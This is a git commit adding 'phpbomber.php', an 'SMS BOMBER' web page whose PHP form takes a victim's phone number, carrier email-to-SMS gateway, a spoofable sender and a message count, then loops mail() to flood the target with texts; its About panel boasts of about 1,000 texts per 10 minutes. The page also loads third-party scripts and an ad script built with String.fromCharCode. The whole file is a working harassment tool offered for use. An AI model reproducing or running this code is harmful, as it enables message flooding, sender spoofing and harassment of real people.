e17f5b547a180db17a4dd0db60e2b5d64ff3c87c
KyxRecon <hoodedexploit@gmail.com>
2016-07-12 16:05:00 -0700

    3
    [ CONTREY BASED ] SMS BOMBER V1.1 REBU1LD

---
+++ phpbomber.php
@@ -0,0 +1,232 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+
+<head>
+<body background="https://4.bp.blogspot.com/-m4uAznCmgVA/V4JY0TfOLZI/AAAAAAAACmc/6sWyuYJvK0EUFvSceV0TPKRkSyCfPnwIACLcB/s1600/1.jpg">
+<p><label for="oper"><b><font size="3" color=000  >SMS BOMBER V1.1 REBU1LD by kyxrecon :</b></font></label><br>
+    <meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
+    <title>SMS BOMBER REBU1LD</title>
+    <meta http-equiv="Content-Language" content="en-us" />
+
+    <meta name="author" content="iSmokeWeed" />
+
+    <script src="http://ismokeweed.co.cc/js/jquery.1.1.4.pack.js" type="text/javascript"></script>
+    <script src="http://ismokeweed.co.cc/js/jquery-easing.1.1.1.pack.js" type="text/javascript"></script>
+    <script src="http://ismokeweed.co.cc/js/jquery-slider.1.0.pack.js" type="text/javascript"></script>
+    <link href="http://ismokeweed.co.cc/styles/stylesheet.css" rel="stylesheet" type="text/css">
+
+    <script type="text/javascript">
+        $(window).bind("load", function() {
+            $("div#slider1").codaSlider()
+            //$("div#slider2").codaSlider()
+            // etc, etc. Beware of cross-linking difficulties if using multiple sliders on one page.
+        });
+    </script>
+
+</head>
+
+<body>
+<div class="title"><br/>sms bomber v1.1 REBU1LD</div><br />
+
+<div class="slider-wrap">
+    <div id="slider1" class="csw">
+        <div class="panelContainer">
+
+            <div class="panel" title="SMS Bomber">
+                <div class="wrapper">
+        <h3><"<body background="https://4.bp.blogspot.com/-m4uAznCmgVA/V4JY0TfOLZI/AAAAAAAACmc/6sWyuYJvK0EUFvSceV0TPKRkSyCfPnwIACLcB/s1600/1.jpg">
+
+        <p>
+
+<script type="text/javascript"> 
+// <![CDATA[ 
+function display(obj,id1,id2,id3,id4) { 
+txt = obj.options[obj.selectedIndex].value; 
+document.getElementById(id1).style.display = 'none'; 
+document.getElementById(id2).style.display = 'none'; 
+document.getElementById(id3).style.display = 'none';
+document.getElementById(id4).style.display = 'none'; 
+
+if ( txt.match(id1) ) { 
+document.getElementById(id1).style.display = 'block'; 
+} 
+if ( txt.match(id2) ) { 
+document.getElementById(id2).style.display = 'block'; 
+} 
+if ( txt.match(id3) ) { 
+document.getElementById(id3).style.display = 'block'; 
+}
+if ( txt.match(id4) ) { 
+document.getElementById(id4).style.display = 'block'; 
+}
+} 
+// ]]> 
+</script> 
+<form action="" method="post" >
+
+<table class="table">
+<tr>
+<td><h5>Phone Number:</h5></td><td><input type="text" class="textBox" name="number" /></td>
+<td><h5>Amount of texts:</h5></td><td><input type="text" class="textBox" name="AmountToSend" /></td>
+</tr>
+<tr>
+
+<td><h5>Victims Country:</h5></td>
+<td>
+  <select name="Heading" style="background:#0C0C0C;color: #ff0909;border: 1px solid #000;min-width:14.6em;" onchange="display(this,'id1','id2','id3','id4');"> 
+  <option class="highlight">Select Country</option> 
+  <option value="id1">United States</option> 
+  <option value="id2">India</option>
+  <option value="id3">United Kingdom</option>
+  <option value="id4">Canada</option> 
+  </select>
+</td>
+
+<td><h5>Cell Phone Provider:</h5></td>
+
+<td>
+    <div id="id1"> 
+  <select name="prov" style="background:#0C0C0C;color: #ff0909;border: 1px solid #ff0909;min-width:14.6em;" id="other">
+  <option value="bad">Select Provider</option>
+  <option value="@vtext.com">Verizon</option>
+  <option value="@text.wireless.alltel.com">Alltell</option>
+  <option value="@txt.att.net">AT&T</option>
+  <option value="@boostmobile.com">Boost Mobile</option>
+  <option value="@mobile.celloneusa.com">Cellular One</option>
+  <option value="@cingular.com">Cingular</option>
+  <option value="@tmomail.net">T-Mobile(USA)</option>
+  <option value="@page.nextel.com">Sprint(Nextel)</option>
+  <option value="@mymetropcs.com">MetroPCS</option>
+  <option value="@messaging.nextel.com">Nextel</option>
+  <option value="@msg.telus.com">Telus Mobility</option>
+  <option value="@bills.com">Virgin Mobile(USA)</option>
+  </select>
+    </div>
+    <div id="id2"> 
+  <select name="prov" style="background:#0C0C0C;color: #ff0909;border: 1px solid #ff0909;min-width:14.6em;" >
+  <option value="bad">Select Provider</option>
+  <option value="@bplmobile.com">BPL mobile</option>
+  <option value="@airtelkk.com">AirTel</option>
+  <option value="@ideacellular.net">Idea Cellular</option>
+  <option value="@orangemail.co.in">Orange</option>
+  <option value="@airsms.com">Aircel</option>
+  <option value="@sms.vodafone.in">Vodafone In</option>
+  <option value="@rpgmail.net">RPG Cellular</option>
+  <option value="@page.nextel.com">Sprint(Nextel)</option>
+  </select>
+    </div>
+    <div id="id3"> 
+  <select name="prov" style="background:#0C0C0C;color: #FFF;border: 1px solid #000;min-width:14.6em;" >
+  <option value="bad">Select Provider</option>
+  <option value="@omail.net">Orange</option>
+  <option value="@o2.co.uk">O2</option>
+  <option value="@t-mobile.uk.net">T-Mobile UK</option>
+  <option value="@vodafone.net">Vodafone UK</option>
+  <option value="@vxtras.com">Virgin Mobile UK</option>
+  </select>
+    </div>
+    <div id="id4"> 
+  <select name="prov" style="background:#0C0C0C;color: #FFF;border: 1px solid #000;min-width:14.6em;" >
+  <option value="bad">Select Provider</option>
+  <option value="@txt.bell.ca">Bell Mobility</option>
+  <option value="@fido.ca">Fido</option>
+  <option value="@fido.ca">Microcell</option>
+  <option value="@text.mtsmobility.com">MTS</option>
+  <option value="@wirefree.informe.ca">NBTel</option>
+  <option value="@pcs.rogers.com">Rogers</option>
+  </select>
+    </div>
+  </td>
+  </td>
+</tr>
+<tr>
+<td><h5>From:</h5></td><td><input type="text" class="textBox" name="From" /></td>
+<td><h5>Subject:</h5></td><td><input type="text" class="textBox" name="Subject" /></td>
+</tr>
+<tr>
+<td><h5>Message:</h5></td><td><textarea rows="1" cols="22" style="background:#0C0C0C;color: #ff0909;border: 1px solid #ff0909;" name="Message"></textarea></td>
+</tr>
+
+<tr><td></td><td align="right"><input type="submit" name="submit" class="submit" value="Submit" style="background:#0C0C0C;color: #ff0909;border: 1px solid #000;padding: 5px;" /></td>
+</tr>
+</table>
+<br />
+<h4>iSmokeWeed SMS Bomber V1.2</h4>
+</form>
+
+<?php
+
+if(strlen($_POST['number']) > 8){
+  if(strlen($_POST['From']) > 1) {
+    if(is_numeric($_POST['AmountToSend'])) {
+
+    if(strlen($_POST['Message'])) {
+    $to = $_POST['number'].$_POST['prov'];
+    $subject = $_POST['Subject'];
+    $message = $_POST['Message'];
+    $headers  = 'MIME-Version: 1.0' . "\r\n";
+    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+    $headers .= 'From: ' . $_POST['From'] . '<' . $_POST['From'] . '>' . "\r\n";
+    $j = 0;
+    $send = $_POST['AmountToSend'];
+    while($j <= $send) {
+    mail($to, $subject, $message, $headers) or die('Error with SMTP.');
+    $j++;
+    echo '';
+    }
+    } 
+    else {
+    echo "You must enter a message!";
+    }
+
+    }
+    else {
+    echo "You need to enter a valid amount of messages to send.";
+    }
+  }
+  else {
+    echo "You must enter who it is from!";
+  }
+    }
+
+?>
+</p></div>
+            </div>        
+
+            <div class="panel" title="About Us">
+                <div class="wrapper">
+        <p>SMS BOMBER V1.1 is completely free. I have always enjoyed making PHP scripts. The SMS bomber and Email bomber can both send approximatively 1,000 texts/emails per 10 minutes. It is very easy to use. </p>
+    <p><b>For the SMS bomber:</b> If your cell phone provider isn't listed, use the "Other" option and simply place your own email extension. Most known providers will have a email extension for there phones so just google it. (Eg: Verizon's is @Vtext.com)</p>
+
+    <h4>SMS Bomber V1.1</h4>
+                </div>
+
+            </div>
+            <div class="panel" title="Support">
+                <div class="wrapper">
+        <h3><img src="https://4.bp.blogspot.com/-m4uAznCmgVA/V4JY0TfOLZI/AAAAAAAACmc/6sWyuYJvK0EUFvSceV0TPKRkSyCfPnwIACLcB/s1600/1.jpg"/></h3>
+        <p>Although iSmokeWeed SMS Bomber V1.2 is completely free, I still offer some support. If you ever need to ask a question, get an error, or want to make a suggestion, feel free to contact me either via email or Hackforums PM</p>
+    <p><b>Email:</b> <a href="mailto:http://kyxhack.blogspot.com/"> #kyxhack</a></p>
+    <p><b>BLOGSPOT:</b>  <a href="http://kyxhack.blogspot.com/">KYXRECON</a></p>
+    <h4>PHP SCRIPT</h4>
+                </div>
+
+            </div>
+
+        </div><script type="text/javascript">
+var AdBrite_Title_Color = '0000FF';
+var AdBrite_Text_Color = '00';
+var AdBrite_Background_Color = '#161616';
+var AdBrite_Border_Color = '#81CA2A';
+var AdBrite_URL_Color = '#81CA2A';
+try{var AdBrite_Iframe=window.top!=window.self?2:1;var AdBrite_Referrer=document.referrer==''?document.location:document.referrer;AdBri​te_Referrer=encodeURIComponent(AdBrite_Referrer);}catch(e){var AdBrite_Iframe='';var AdBrite_Referrer='';}
+</script>
+<span style="white-space:nowrap;"><script type="text/javascript">document.write(String.fromCharCode(60,83,67,82,73,80,84));document.write(' src="http://ads.adbrite.com/mb/text_group.php?sid=1597946&zs=3732385f3930&ifr='+AdBrite_Iframe+'&ref='+AdBrite_Referrer+'" type="text/javascript">');document.write(String.fromCharCode(60,47,83,67,82,73,80,84,62));</script>
+</span>
+    </div>
+</div>
+
+</body>
+
+</html>
